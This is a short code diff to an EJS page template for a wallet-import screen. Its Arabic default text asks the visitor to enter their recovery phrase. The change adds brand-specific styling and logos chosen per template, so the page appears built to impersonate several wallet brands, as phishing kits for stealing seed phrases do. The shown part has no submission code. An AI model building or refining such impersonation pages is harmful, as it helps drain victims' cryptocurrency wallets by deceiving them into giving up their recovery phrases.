@@ -31,9 +31,9 @@ h1{font-size:1.2rem;margin-bottom:8px;text-align:center}
 .err{background:#ef444420;border:1px solid #ef444440;border-radius:8px;padding:10px 14px;font-size:.84rem;color:#fca5a5;margin-bottom:12px;display:none}
 </style>
 </head>
-<body>
+<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
 <div class="card">
-  <span class="brand-logo"><%= tpl.name %></span>
+  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:12px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
   <div class="shield">🔐</div>
   <h1><%= pageContent.headline || 'استيراد محفظة موجودة' %></h1>
   <p class="sub"><%= pageContent.subheadline || 'أدخل عبارة الاسترداد الخاصة بك للوصول إلى محفظتك' %></p>
